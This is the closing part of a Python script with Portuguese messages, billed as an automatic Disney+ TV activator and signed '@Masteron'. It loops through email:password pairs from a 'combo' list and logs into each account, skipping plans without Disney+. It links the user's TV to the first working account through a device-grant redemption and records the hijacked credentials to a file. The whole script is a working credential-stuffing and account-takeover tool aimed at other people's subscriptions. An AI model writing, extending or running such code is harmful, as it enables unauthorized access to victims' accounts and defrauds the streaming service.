            new_anon, new_ref = get_anon_token(ass, apikey) if ass else (None, None)
            if new_anon:
                current_anon_token, current_anon_refresh = new_anon, new_ref
                status, auth_token, is_sub_flag, action_grant, account_id, user_refresh = do_login(
                    email, password, current_anon_token
                )

        if status != "OK" or not auth_token:
            print(f"{R}[LOGIN FALHOU: {status}]{RS}")
            continue

        print(f"{G}[LOGIN OK]{RS}", end=" ", flush=True)

        # Checa plano / assinatura
        sub_data = check_subscription(auth_token)
        plan, country, flag = _build_plan(sub_data) if sub_data else ("N/A", "N/A", "🌐")
        if "hulu with ads" in plan.lower() and "disney" not in plan.lower():
            print(f"{Y}[PLANO SEM DISNEY+: {plan}]{RS}")
            continue

        print(f"{C}[{plan} | {country} {flag}]{RS}", end=" ", flush=True)

        acc_id = account_id or (sub_data.get("account_id") if sub_data else None)
        ref_tok = user_refresh or current_anon_refresh

        # Vincula a TV via redeemOffDeviceGrant usando o offDeviceGrant obtido
        if not action_grant:
            print(f"{R}[SEM ACTION_GRANT]{RS}")
            continue

        ok, motivo = redeem_tv_grant(action_grant, off_device_grant, auth_token, acc_id, ref_tok)
        if ok:
            try:
                with open(FILE_ACTIVATED, "a", encoding="utf-8") as f_ok:
                    agora = datetime.now().strftime("%d/%m/%Y %H:%M")
                    f_ok.write(f"{email}:{password} | TV: {license_plate} | {plan} | {country} | Data: {agora}\n")
            except Exception:
                pass
            print()
            print(f"\n{G}╔══════════[TV ATIVADA COM SUCESSO!]══════════╗{RS}")
            print(f"{G}║{RS} {W}Conta : {Y}{email}:{password}{RS}")
            print(f"{G}║{RS} {W}Plano : {C}{plan}{RS}")
            print(f"{G}║{RS} {W}País  : {W}{country} {flag}{RS}")
            print(f"{G}║{RS} {W}Código: {C}{license_plate}{RS}")
            print(f"{G}║{RS} {G}Sua TV já está conectada e pronta para assistir!{RS}")
            print(f"{G}╚═════════[@Masteron]═════════════════════════╝{RS}\n")
            return True
        else:
            print(f"{R}[FALHA AO VINCULAR TV: {motivo}]{RS}")

    print(f"\n{R}[!] Nenhuma conta conseguiu ativar a TV.{RS}")
    print(f"{Y}    Verifique se o código não expirou ou adicione novas contas no combo.{RS}\n")
    return False


# --- main ---

def main():
    if sys.platform == "win32":
        try:
            sys.stdout.reconfigure(encoding="utf-8", errors="replace")
            sys.stderr.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass
        os.system("color")
        os.system("chcp 65001 > nul")

    print(f"\n{C}╔══════════════════════════════════════════╗{RS}")
    print(f"{C}║      Disney+ - Ativador Automático TV    ║{RS}")
    print(f"{C}╚══════════════════════════════════════════╝{RS}")

    print(f"\n{DIM}[*] Conectando aos serviços Disney...{RS}", end="", flush=True)
    apikey = get_client_apikey()
    print(f" {G}OK{RS}")

    # Loop contínuo: ativa e já reinicia pedindo o próximo código da TV
    while True:
        try:
            plate = input(f"\n{W}[?] Digite o código de 8 dígitos da sua TV (ou 'sair'): {RS}").strip().replace("-", "").replace(" ", "")
            if not plate:
                continue
            if plate.lower() in ("sair", "exit", "q", "quit", "0"):
                print(f"\n{C}[+] Encerrando ativador. Até logo!{RS}\n")
                break

            # Carrega as contas da pasta disney/ (já descartando as já ativadas)
            accounts = load_combo()
            if not accounts:
                continue

            # Ativa direto na TV!
            sucesso = activate_tv_direto(accounts, plate, apikey)

            if sucesso:
                # Simula "reiniciar" a py: limpa tela e mostra o banner novamente
                time.sleep(2)
                os.system("cls" if sys.platform == "win32" else "clear")
                print(f"\n{C}╔══════════════════════════════════════════╗{RS}")
                print(f"{C}║      Disney+ - Ativador Automático TV    ║{RS}")
                print(f"{C}╚══════════════════════════════════════════╝{RS}")
                print(f"\n{G}[✔] TV anterior ativada com sucesso!{RS}")
                print(f"{G}[+] Pronto para ativar a próxima TV!{RS}")
            else:
                print(f"{C}{'─' * 52}{RS}")
                print(f"{Y}[!] Tente um código novo ou adicione mais contas em disney/{RS}")
        except KeyboardInterrupt:
            print(f"\n\n{C}[+] Encerrando. Até logo!{RS}\n")
            break
        except Exception as e:
            print(f"\n{R}[!] Erro inesperado: {e}{RS}\n")

if __name__ == "__main__":
    main()
